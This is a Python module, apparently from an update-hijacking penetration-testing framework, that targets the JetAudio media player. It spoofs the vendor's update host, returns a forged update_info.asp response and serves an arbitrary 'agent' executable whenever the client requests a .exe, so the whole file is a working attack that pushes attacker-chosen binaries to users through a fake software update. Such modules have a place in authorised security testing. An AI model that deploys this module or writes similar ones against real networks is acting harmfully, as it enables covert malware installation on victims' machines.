from modules import ModuleBase


class JetAudio(ModuleBase):
    name = 'JetAudio'
    appver = '<= 1.0.0'
    version = '7.5.4.20'
    author = ['German Rodriguez < grodriguez +[AT]+ infobytesec.com >']
    description = ''
    vh = 'www.jetaudio.com' 
    requests = [
        {   'path': '/jetaudio_update/update_info.asp',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/jet/update_info.asp',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
